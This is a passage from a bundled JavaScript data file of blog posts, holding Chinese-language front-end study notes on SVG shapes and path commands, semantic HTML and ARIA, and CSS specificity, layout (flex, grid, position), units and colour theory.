<code>&lt;polygon fill=&quot;#D271FF&quot; points=&quot;100,56 62,107 37,49&quot;/&gt;</code>\n<br>├ 使用 <code>points</code> 標記多邊形的每個點，即幾邊形就會有幾個點\n<br>└ 其餘的設定與矩形相同</li>\n</ol>\n<h5 id=\"3-path\">3. Path</h5>\n<ul>\n<li>Path 可說是組成 SVG 物件裡最強大的基本形狀</li>\n<li><code>&lt;path d=&quot;M0 0 L50 50 A50 50 0 0 0 100 0&quot; stroke=&quot;#f00&quot; fill=&quot;none&quot;/&gt;</code></li>\n<li>Path 以屬性 <code>d</code> 開始定義，後續包含一系列的指令</li>\n</ul>\n<p>各個指令所使用的參數：</p>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>參數</th>\n<th>指令說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>M</td>\n<td>x y</td>\n<td>起始點的 x , y 座標 ( move to )</td>\n</tr>\n<tr>\n<td>H</td>\n<td>x</td>\n<td>從目前點的座標畫水平直線到指定的 x 軸座標 ( horizontal line to )</td>\n</tr>\n<tr>\n<td>V</td>\n<td>y</td>\n<td>從目前點的座標畫垂直線到指定的 y 軸座標 ( vertical line to )</td>\n</tr>\n<tr>\n<td>L</td>\n<td>x y</td>\n<td>從目前點的座標畫直線到指定點的 x , y 座標 ( line to )</td>\n</tr>\n<tr>\n<td>C</td>\n<td>x1 y1 x2 y2 x y</td>\n<td>從目前點的座標畫條貝茲曲線到指定點的 x, y 座標：其中 x1, y1 及 x2, y2 為控制點 ( curve )</td>\n</tr>\n<tr>\n<td>S</td>\n<td>x2 y2 x y</td>\n<td>從目前點的座標畫條反射的貝茲曲線到指定點的 x, y 座標：其中 x2, y2 為反射的控制點 ( smooth curve )</td>\n</tr>\n<tr>\n<td>Q</td>\n<td>x1 y1 x y</td>\n<td>從目前點的座標畫條二次貝茲曲線到指定點的 x, y 座標：其中 x1, y1 為控制點 ( quadratic Bézier curve )</td>\n</tr>\n<tr>\n<td>T</td>\n<td>x y</td>\n<td>從目前點的座標畫條鏡射二次貝茲曲線到指定點的 x, y 座標：以前一個座標為反射控制點( smooth quadratic Bézier curve )</td>\n</tr>\n<tr>\n<td>A</td>\n<td>rx ry x-axis-rotation large-arc-flag sweep-flag x y</td>\n<td>從目前點的座標畫個橢圓形到指定點的 x, y 座標：其中 rx, ry 為橢圓形的 x 軸及 y 軸的半徑，x-axis-rotation 是弧線與 x 軸的旋轉角度，large-arc-flag 則設定 1 最大角度的弧線或是 0 最小角度的弧線，sweep-flag 設定方向為 1 順時針方向或 0 逆時針方向 ( Arc )</td>\n</tr>\n<tr>\n<td>Z</td>\n<td>無參數</td>\n<td>關閉路徑，將目前點的座標與第一個點的座標連接起來 ( closepath )</td>\n</tr>\n</tbody></table>\n<h5 id=\"4-stroke\">4. Stroke</h5>\n<ul>\n<li><code>stroke</code>：邊框顏色</li>\n<li><code>stroke-width</code>：邊框寬度</li>\n<li><code>stroke-linecap</code>：邊框端點屬性（<code>butt</code>（預設）、<code>square</code>、<code>round</code>）</li>\n<li><code>stroke-linejoin</code>：邊框兩端接合尖角屬性（<code>miter</code>（預設）、<code>round</code>、<code>bevel</code>）</li>\n<li><code>stroke-dasharray</code>：邊框虛線化的長度與間隔，單數值代表實線的長度，雙數值代表虛線的長度，只有單數個參數時會預設複製一份參數</li>\n<li><code>stroke-dashoffset</code>：邊框虛線化的線條相對起點的偏移量，正值向右負值向左</li>\n</ul>\n<h5 id=\"5-viewport\">5. Viewport</h5>\n<ul>\n<li>可以透過 <code>svg</code> 標籤上的 <code>width</code> 和 <code>height</code> 屬性設定 viewport 的尺寸</li>\n<li><code>&lt;svg width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;!-- SVG內容 --&gt;&lt;/svg&gt;</code></li>\n<li>SVG 裡的值不一定會有單位，無單位的值會採用用戶座標系裡的用戶單位</li>\n<li>預設為 <code>px</code>，其他也支援 <code>em</code>、<code>ex</code>、<code>px</code>、<code>pt</code>、<code>pc</code>、<code>cm</code>、<code>mm</code>、<code>in</code>、<code>百分比</code>。</li>\n<li>初始化的 viewport 座標系以左上角為 (0,0) 開始計算，X 軸向右為正向，Y 軸向下為正向。</li>\n<li><code>&lt;svg viewBox=&quot;&lt;min-x&gt; &lt;min-y&gt; width height&quot;&gt;&lt;/svg&gt;</code></li>\n<li><code>preserveAspectRatio</code></li>\n</ul>\n<h5 id=\"6-fill\">6. Fill</h5>\n<h2 id=\"語意化撰寫\">語意化撰寫</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mikimhk/items/05b303d932093eb4c0d1\">なんとなくで書かないで！HTML5 を書く時に気にしてみたいタグごとのお約束</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://creive.me/archives/8814\">SEO 対策として最低限押さえておきたい HTML/HTML5 マークアップの大事な 6 つのポイント | creive【クリーブ】</a></li>\n<li>便於機械閱讀，能夠取得更好的 SEO 效果，並能讓螢幕閱讀器正確讀取</li>\n<li>也便於人類閱讀，提升網頁的維護性</li>\n</ul>\n<h3 id=\"標籤\">標籤</h3>\n<ul>\n<li>標籤內容的種類</li>\n<li>可輸入標籤中的內容</li>\n<li>可否省略標籤</li>\n<li>可位於其之上的母元素</li>\n<li>可使用的 Aria role</li>\n<li>DOM 介面</li>\n</ul>\n<h3 id=\"應該避開的寫法\">應該避開的寫法</h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- Bad Example --></span>\n<span class=\"token comment\">&lt;!-- 直接在 a 標籤上加上 onclick --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>alert(<span class=\"token punctuation\">'</span>alert!<span class=\"token punctuation\">'</span>)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>button<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token comment\">&lt;!-- 在 a 標籤裡再加入 a 標籤 --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>Title<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Link<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre><ol>\n<li>使用點擊觸動 js 時應該使用 <code>&lt;button&gt;</code>，因為無法預期執行的行為為何</li>\n<li><code>&lt;a&gt;</code> 標籤不允許擁有 <code>&lt;a&gt;</code> 標籤的母元素</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- Bad Example --></span>\n<span class=\"token comment\">&lt;!-- 沒有加入 alt 元素，試圖直接以 title 取代 --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://example.com/img/example.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">title</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Title<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></code></pre><h3 id=\"aria-標籤\">Aria 標籤</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://lepture.com/zh/2015/fe-aria-label\">前端的基礎修養：aria-label - Just lepture</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.google.com/web/fundamentals/accessibility/semantics-aria/aria-labels-and-relationships?hl=zh-tw\">ARIA 標籤和關係  |  Web  |  Google Developers</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/articles/10222429\">實作無障礙網頁功能：麵包屑 Breadcrumb - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n</ul>\n","date":"2019-07-18T07:07:01.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"7 min read"};

var route_65 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod51
});

var Mod52 = {"title":"前端筆記 (2) CSS","slug":"f2e-02-css","html":"<h2 id=\"現代-css-常見的基礎技術\">現代 CSS 常見的基礎技術</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/arowM/items/e1af320e2755461649a0#%E7%8F%BE%E4%BB%A3%E7%9A%84%E3%81%AA%E4%BD%BF%E3%81%84%E3%81%8B%E3%81%9F%E3%81%AE%E5%9F%BA%E7%A4%8E\">現代開発者のための CSS 基礎技術 - Qiita</a></li>\n</ul>\n<ol>\n<li>套用的對象差異：單頁網頁／網頁應用程式</li>\n<li>支援的瀏覽器差異</li>\n<li>將文章構造與表現手法分離</li>\n<li>不使用行內樣式</li>\n<li>不使用表現手法命名 class</li>\n<li>使用 psuedo-class, wai-aria, custom data attribute 處理不同狀態下的樣式</li>\n<li>使用 modern reset, vender prefix 處理瀏覽器差異</li>\n<li>使用 transition, animation 處理動畫</li>\n</ol>\n<h2 id=\"a-層級\">a. 層級</h2>\n<ol>\n<li>基本層：一般就是 reset.css 或 normalize.css</li>\n<li>框架層：處理網頁整體框架的 css\n└ 左右欄、全屏、上下左右區塊，有什麼東西都沒差</li>\n<li>元件層：處理單個 UI 元件的 css\n└ 一個小按鈕，在哪裏都沒差</li>\n<li>狀態層：處理單個 UI 元件的狀態\n└ 錯誤的樣子，按鈕也會出現錯誤的樣子，箱子也會。.</li>\n<li>模板層：只處理模板的 css，專屬於這個設計的 css\n└ 一個小按鈕，在某個模板，我的按鈕比較不一樣</li>\n</ol>\n<h2 id=\"b-權重\">b. 權重</h2>\n<p>相同權重但是後寫的 css，可以覆蓋先寫的 css\n當兩個選擇器同時作用在一個元素，權重高的優先生效</p>\n<h3 id=\"基本權重\">基本權重</h3>\n<p><code>!important</code></p>\n<blockquote>\n<p><code>inline style</code> &gt; <code>id</code> &gt; <code>class</code>／<code>psuedo-class</code>（偽類）／<code>attribute</code>（屬性選擇器）\n<code>Element</code> &gt; <code>*</code></p>\n</blockquote>\n<ul>\n<li>最左邊的權重最高，最右邊的權重最低</li>\n<li><code>Element</code>：所有的 Element 的權重都是 <code>0-0-0-1</code></li>\n<li><code>class</code>：每一個 class 的權重都是 <code>0-0-1-0</code></li>\n<li><code>psuedo-class</code>：和 attribute 權重相同</li>\n<li><code>id</code>：每一個 id 的權重都是 <code>0-1-0-0</code></li>\n<li><code>inline style attribute</code>，寫在 html 行內的 style。\ninline style attribute 的權重為 <code>1-0-0-0</code></li>\n<li><code>!important</code>：可以蓋過所有的權重</li>\n</ul>\n<h2 id=\"0-reset\">0. Reset</h2>\n<ol>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://meyerweb.com/eric/tools/css/reset/\">reset.css</a>\n└ 將 margin 和 padding 全設為 0，並自行修改設定</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://necolas.github.io/normalize.css/\">normalize.css</a>\n└ 軟性統一瀏覽器規範、修正 Bug，提高可用性</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://csstools.github.io/sanitize.css/\">sanitize.css</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/filipelinhares/ress\">ress.css</a>\n└<code>link rel=&#39;stylesheet&#39; href=&#39;https://unpkg.com/ress/dist/ress.min.css&#39;</code></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hankchizljaw.com/wrote/a-modern-css-reset/\">A Modern CSS Reset</a></li>\n</ol>\n<p>有兩種好的 debug 框線做法：</p>\n<ol>\n<li>用 <code>outline</code>（用法和 <code>border</code> 一模一樣）</li>\n<li>用 <code>box-shadow</code></li>\n</ol>\n<h2 id=\"1-顯示與定位\">1. 顯示與定位</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://lopan.jp/css-layout2/\">段組みの CSS。</a></li>\n</ul>\n<h3 id=\"display\">display</h3>\n<h4 id=\"1-block\">1. <code>block</code></h4>\n<p>帶有面積，可設定寬高</p>\n<h4 id=\"2-inline\">2. <code>inline</code></h4>\n<p>：設定寬高無效，可設定 padding 的左右值，上下值無效、無法被撐開</p>\n<h4 id=\"3-inline-block\">3. <code>inline-block</code></h4>\n<p>同時擁有兩種 display 的特性，可設定寬高，也可與其他元素並排\n│ 使用 <code>inline-block</code> 排板時，標籤如 <code>a</code> 或 <code>li</code> 之間會有空白字元，\n└ 需於父元素中設定字元大小為 0，再設定子元素的標籤文字大小。</p>\n<h4 id=\"4-flex\">4. flex</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/css/2017/07/21/css-flex/\">圖解：CSS Flex 屬性一點也不難</a>\n├ <code>justify-</code>：主軸\n├ <code>align-</code>：次軸\n├ <code>-items</code>：單行元素\n└ <code>-content</code>：多行元素</li>\n<li><code>order</code>：各個元素的預設值為 0\n設定其中一個元素為 1 就會移到最右邊（其它為 0）\n設定為 -1 則會移到最左邊</li>\n<li><code>flex-basis</code>：控制主軸長度（主軸為衡=寬度 width，主軸為縱=高度 height）\n權重比 width 和 height 大</li>\n<li><code>flex-grow</code>：分配剩餘空間，預設值為 0</li>\n<li><code>flex-shrink</code>：收縮比，預設值為 1\n<code>( 子項目寬*收縮比/總比值 ) * 超出值 = 扣除值</code>\n若設為 0 則由 basis 與 grow 進行計算</li>\n<li><code>align-content</code> 針對多行，<code>align-items</code> 針對單行，<code>align-self</code> 針對單一元素</li>\n<li><code>flex-flow</code></li>\n<li><code>flex-direction</code>:\n├ row\n├ row-reverse\n├ column\n└ column-reverse</li>\n<li><code>flex-wrap</code>:\n├ nowrap\n├ wrap\n└ wrap-reverse</li>\n</ul>\n<h4 id=\"5-grid\">5. grid</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://grid.malven.co/\">GRID: A simple visual cheatsheet for CSS Grid Layout</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/css/2017/03/22/css-grid-layout/\">CSS Grid 屬性介紹</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/design/2018/10/18/grid-system/\">鐵人賽：網頁設計常用格線系統 ( 上 )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/design/2018/10/19/grid-system-2/\">鐵人賽：網頁設計常用格線系統 ( 下 )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.hinablue.me/css-grid-layout/\">關於 Grid Layout 的使用姿勢</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://css-tricks.com/snippets/css/complete-guide-grid/\">A Complete Guide to Grid</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/%E6%89%8B%E5%AF%AB%E7%AD%86%E8%A8%98/using-css-grid-to-draw-test-card-7ed24d3559ab\">CSS Grid | 剛學會怎麼用 Grid，那就來畫個 TV 檢驗圖練練手吧！- 手寫筆記 - Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/enjoy-life-enjoy-coding/css-%E6%89%80%E4%BB%A5%E6%88%91%E8%AA%AA%E9%82%A3%E5%80%8B%E7%89%88%E8%83%BD%E4%B8%8D%E8%83%BD%E5%A5%BD%E5%88%87%E4%B8%80%E9%BB%9E-grid-%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-cd763091cf70\">CSS | 所以我說那個版能不能好切一點？- Grid 基本用法 - Enjoy life enjoy coding - Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.hinablue.me/css-grid-layout/\">[CSS] 關於 Grid Layout 的使用姿勢</a></li>\n</ul>\n<h5 id=\"grid-介紹\">grid 介紹</h5>\n<ul>\n<li>grid 並非用與取代 flexbox，而是補足 flexbox 的不足</li>\n<li>需先使用 <code>display: grid</code> 定義主容器顯示類型</li>\n<li>再使用 grid template 定義版型結構</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://grid.layoutit.com/\">CSS Grid Generator | LayoutIt!</a></li>\n</ul>\n<h5 id=\"長寬\">長寬</h5>\n<ul>\n<li><code>grid-template-columns</code>：宣告每行 （橫列）寬度，劃分 Y 軸線</li>\n<li><code>grid-template-rows</code>：宣告每列（直列）高度，劃分 X 軸線</li>\n<li>寬高可使用空行區隔來指定每行／列內的各空間寬度</li>\n<li>可使用 <code>repeat ( 4,2rem )</code> 一次建立 4 行 2rem 寬度的空間\n<code>repeat ( )</code> 內還可使用 <code>auto-fill</code> 填滿所有空間或 <code>auto-fit</code> 填滿至指定空間</li>\n<li><code>fr</code> 是總數比例單位，例如 <code>grid-template-columns: 1fr 1fr 2fr;</code> 是宣告每欄寬度為 1/4、1/4、2/4</li>\n<li><code>max-content</code> 取得容器最大尺寸的空間當成填充條件\n<code>min-content</code> 取得容器最小尺寸的空間當成填充條件\n<code>minmax ( min, max )</code> 以最小尺寸 <code>min</code> 定義，最大尺寸需小於或等於 <code>max</code></li>\n<li><code>auto</code> 自動設定空間尺寸，上述寬高指定也可以混用\nex：<code>grid-template-columns: 1fr min-content minmax ( 100px, max-content ) ;</code></li>\n<li>也可以使用 <code>grid-auto-columns</code>, <code>grid-auto-rows</code> 快速指定版型\nex：<code>grid-auto-columns: 60px;</code></li>\n</ul>\n<h5 id=\"分配\">分配</h5>\n<ul>\n<li><code>grid-auto-flow</code>：宣告 Grid 的排列方式\n├ 預設為 <code>row</code> 先欄後列\n└ 還有 <code>column</code> 先列後欄、 <code>dense</code> 自動填滿</li>\n<li><code>grid-template-areas</code>:\n<code>&quot;header header header header header&quot;</code>\n<code>&quot;side main main main main&quot;</code>\n<code>&quot;side footer footer footer footer&quot;;</code>\n定義主容器裡各區塊的位置與名稱，可使用 <code>.</code> 略過某區塊不指定</li>\n<li><code>grid-area</code>：指定區塊名稱，並配置至對應位置</li>\n<li><code>grid-area</code> 的區塊必須是連接在一起的，即不可一個區塊名稱分散於兩側位置，並且只能是矩形</li>\n<li><code>grid-gap</code>：區域之間的距離，可省略前面的前綴 <code>grid-</code>\n├ <code>grid-gap: { grid-row-gap } { grid-column-gap };</code>\n├ <code>grid-column-gap: { grid-column-gap };</code>\n└ <code>grid-row-gap: { grid-row-gap };</code></li>\n</ul>\n<h5 id=\"區塊\">區塊</h5>\n<ul>\n<li><code>grid-column: &lt;起始 column-num&gt; / &lt;結束 column-num&gt;</code>：宣告區塊定位自己位置</li>\n<li><code>grid-row: &lt;起始 row-num&gt; / &lt;結束 row-num&gt;</code>：宣告區塊定位自己位置</li>\n<li><code>justify-self</code>，<code>align-self</code>：同 <code>flexbox</code> 用法</li>\n</ul>\n<h4 id=\"6-其它-display-屬性\">6. 其它 display 屬性</h4>\n<ul>\n<li><code>inherit</code></li>\n<li><code>initial</code></li>\n<li><code>unset</code></li>\n<li><code>z-index</code></li>\n<li><code>float</code>\n├ 需搭配 clear 清除\n└ 可製作文繞圖 / 多欄編排效果</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/%E9%A6%AC%E6%A0%BC%E8%95%BE%E7%89%B9%E7%9A%84%E5%86%92%E9%9A%AA%E8%80%85%E6%97%A5%E8%AA%8C/css-%E6%B5%AE%E5%8B%95%E8%88%87%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8B%95-34d3f49ef817\">[CSS] 浮動 (float) 與清除浮動 (clear)</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://csscoke.com/2018/08/21/css-vertical-align/\">23 種 CSS 垂直置中技巧</a></li>\n</ul>\n<h3 id=\"position\">position</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/users/20112550/ironman/2092\">連續 30 天的超實務網頁設計的垂直置中教學</a></li>\n</ul>\n<h4 id=\"1-fixed\">1. <code>fixed</code></h4>\n<p>浮動，以瀏覽器視窗為定位，固定於視窗範圍內\n├ 將 <code>top</code>、<code>left</code>、<code>right</code>、<code>left</code> 都設為 0，\n│ <code>margin</code> 設定為 <code>auto</code>，元素就會在瀏覽器正中間。\n├ <code>fixed</code>、<code>absolute</code>、<code>float</code> 與 <code>flex</code> 底下的元素皆預設為不會自動抓取空間寬度，\n└ 因此設定寬度後會取得所在空間寬度並與空間等寬。</p>\n<h4 id=\"2-relative\">2. <code>relative</code></h4>\n<p>相對，保留原始空間，與原始位置做偏移，\n有定位的物件的 <code>z-index</code> 會優先於沒有定位的物件，\n如果兩個都有定位，原始碼後方的物件會蓋住前方的，<code>z-index</code> 預設都是 0。</p>\n<h4 id=\"3-absolute\">3. <code>absolute</code></h4>\n<p>絕對，類似於 <code>fixed</code>，獨自獨立一層。\n當一個物件設定為絕對定位，會去父層尋找是否 <code>relative</code>、<code>absolute</code> 或是 <code>fiexd</code> 定位設定，\n上方首個有定位的父層會成為物件絕對定位位置的依據，\n如果沒有，預設會定位在<strong>瀏覽器視窗上</strong> （注意，不是 <code>body</code> 也不是 <code>html</code>），\n但不同於 <code>fixed</code>，預設只會定位一次，拉動捲軸會跟著捲軸跑，不會固定在視窗上。</p>\n<h4 id=\"4-static：無定位\">4. <code>static</code>：無定位</h4>\n<h4 id=\"5-sticky：邊界\">5. <code>sticky</code>：邊界</h4>\n<h3 id=\"vertical-align\">vertical-align</h3>\n<h2 id=\"2-尺寸\">2. 尺寸</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/yama-t/items/da7740769cfc0f8446a0\">フロントエンドのプロ直伝！CSS 余白設定の三原則 ( ＋線の引き方 )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/css/2016/06/08/css-margin-collapsing/\">CSS 失控的 Margin top | 卡斯伯 Blog - 前端，沒有極限</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/articles/10213624?sc=hot\">[30 道難解的 CSS 排版] 第 1 道：認識對齊 I</a></li>\n</ul>\n<ol>\n<li><code>height</code>：高度</li>\n<li><code>width</code>：寬度</li>\n<li><code>padding</code>：內間隔</li>\n<li><code>margin</code>：外間隔</li>\n</ol>\n<ul>\n<li><code>padding</code> 和 <code>margin</code> 的值設為 <code>auto</code> 時，其值等同 <code>母元素的長寬度 - 當前元素的長寬度</code></li>\n</ul>\n<h3 id=\"單位\">單位</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.oxxostudio.tw/articles/201809/css-font-size.html\">一次搞懂 CSS 字體單位：px、em、rem 和 %</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.w3.org/Style/Examples/007/units.zh_HK.html\">CSS: em, px, pt, cm, in…</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://katydecorah.com/css-ruler/\">CSS Ruler</a></li>\n<li>速算：<code>100%</code> = <code>1em</code> = <code>1rem</code> = <code>16px</code> = <code>12pt</code></li>\n<li>螢幕內容列印時的單位轉換：<code>Pixel</code> → <code>inch</code> → <code>dot</code></li>\n<li>螢幕內容顯示時的單位轉換：相對單位 → <code>px</code> → （ppi） → <code>inch</code> → 絕對單位\n（<code>1inch</code> = <code>2.54cm</code> = <code>25.4mm</code> = <code>72pt</code> = <code>6pc</code>）</li>\n</ul>\n<ol>\n<li><code>px</code>（pixel，像素）：絕對值\n├ 於同一顯示器下時，不會因為瀏覽器視窗長寬改變，或是網頁內容更換而使得像素的尺寸改變\n└ <code>pixel</code> 是種圖像元素單位，沒有個具體的長寬值，實際的物理尺寸會隨著顯示器的解析度與寬度而改變</li>\n<li><code>%</code>：相對值，參照 <code>母元素</code>，視其母元素為 100%</li>\n<li><code>em</code>：相對值，參照 <code>當前元素</code>，視當前元素的字體大小為 1em</li>\n<li><code>rem</code>：相對值，參照 html 根元素 <code>&lt;html&gt;</code>，視根元素的字體大小為 1rem\n└ 瀏覽器的預設字體大小為 <code>16px</code>，因此通常 <code>1rem</code> = <code>16px</code></li>\n<li><code>vw</code>：相對值，參照<code>瀏覽器畫面寬度</code>，視畫面寬度為 100vw\n└ 語法上省略了中間的 <code>%</code> 符號，其中的 <code>v</code> 為從 viewport（視口）而來，</li>\n<li><code>vh</code>：相對值，參照瀏覽器畫面高度，視畫面寬為 100vh</li>\n<li><code>vmax</code>：相對值，目前 <code>vw</code> 和 <code>vh</code> 兩者之中比較大的值</li>\n<li><code>vmin</code>：相對值，目前 <code>vw</code> 和 <code>vh</code> 兩者之中比較小的值</li>\n<li><code>ex</code>：相對值，等同於第一個可用字體裡的「x 文字的高度」\n└ 但在不包含 x 文字的字體之中亦會定義此單位，通常用於以文字為重的設計中</li>\n<li><code>calc()</code>：可在括號中撰寫計算式，指定較為複雜的動態數值\n└ 上述的單位皆可用於此計算中</li>\n<li><code>max()</code></li>\n<li><code>min()</code></li>\n<li><code>clamp()</code></li>\n</ol>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.zhangxinxu.com/wordpress/2020/04/css-min-max-clamp/\">了解 CSS min()/max()/clamp()数学函数 « 张鑫旭-鑫空间-鑫生活</a></li>\n</ul>\n<h2 id=\"3-背景、色彩\">3. 背景、色彩</h2>\n<h3 id=\"背景\">背景</h3>\n<ol>\n<li><code>background-color</code></li>\n<li><code>background-image</code></li>\n<li><code>background</code>\n├ <code>background: color image attachment repeat poition / size</code>\n├ 各值都可忽略，僅 <code>background-position</code> 與 <code>background-size</code> 擁有相依關係\n│ 有 <code>background-position</code> 時，可以不必加上 <code>/</code>\n│ 有 <code>background-size</code> 時，一定要加上 <code>/</code> 以及 <code>background-position</code>\n├ <code>linear-gradient(顏色漸變方向角, 色碼 1, 色碼 2);</code>\n└ <code>radial-gradient(ellipse 或 circle, 顏色 1, 顏色 2) ;</code></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-position\"><code>background-position</code></a></li>\n</ol>\n<h3 id=\"色彩\">色彩</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/maccotsan/items/d51c992a20385427e689\">エンジニアのための配色まとめ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kaizen_nagoya/items/cb7eb3199b0b98904a35\">プログラマが知っているとよい色使い ( 安全色 ) とカラーユニバーサルデザイン</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://csscoke.com/2015/01/01/rgb-hsl-hex/\">RGB、HSL、Hex 網頁色彩碼，看完這篇全懂了</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://juejin.im/post/5c6caee26fb9a049df24a4df\">Web 開發者需要瞭解的基礎色彩理論</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=_2LLXnUdUIc\">Beginning Graphic Design: Color - YouTube</a></li>\n</ul>\n<h4 id=\"三原色\">三原色</h4>\n<ul>\n<li>RGB</li>\n<li>以 R 在上方順時鐘排列</li>\n</ul>\n<h4 id=\"第二次色\">第二次色</h4>\n<ul>\n<li>印表機的 CMYK（藍、洋紅、黃）三色</li>\n<li>由 RGB 中間色產出的混合色</li>\n<li>以 C 在下方同呈順時鐘排列</li>\n</ul>\n<h4 id=\"色相環\">色相環</h4>\n<ul>\n<li>色相 Hue\n├ 顏色\n└ 0 度為 R（紅）色，120 度為 G（綠）色，240 度為 B（藍）色</li>\n<li>飽和度 Saturation\n├ 顏色的強度，即顏色的濃淡、鮮豔度\n└ 不同於明度於飽和度降低後，為接近灰色而不是黑色。</li>\n<li>明度 Lightness\n├ 顏色從黑到白的明暗程度\n└ 一般 HSL 色彩的 L 預設值會為 50%，調暗往 0% 調整，調亮往 100% 調整。</li>\n</ul>\n<p>HSL 色彩寫法為 <code>HSL (色相角度不加單位 0~360, 色彩飽和度 0~100%, 色彩亮度 0~100%)</code>。</p>\n<h4 id=\"十六進位色彩\">十六進位色彩</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.colorhexa.com/\">Hex colors</a></li>\n</ul>\n<h4 id=\"色彩調和\">色彩調和</h4>\n<ul>\n<li>單色系公式 Monochromatic\n使用飽和度與明度創造變畫，一定能創造出和諧的配色組合</li>\n<li>類似色系 Analogous\n運用色相環上鄰近的顏色配對\n例如紅橘或冷色調的藍綠</li>\n<li>補色系 Complementary\n色相環上位於相對面位置的兩個顏色，例如藍橘或經典的紅綠，\n避免過於單調可以加入明暗或濃淡的變化</li>\n<li>補色分割法 Split 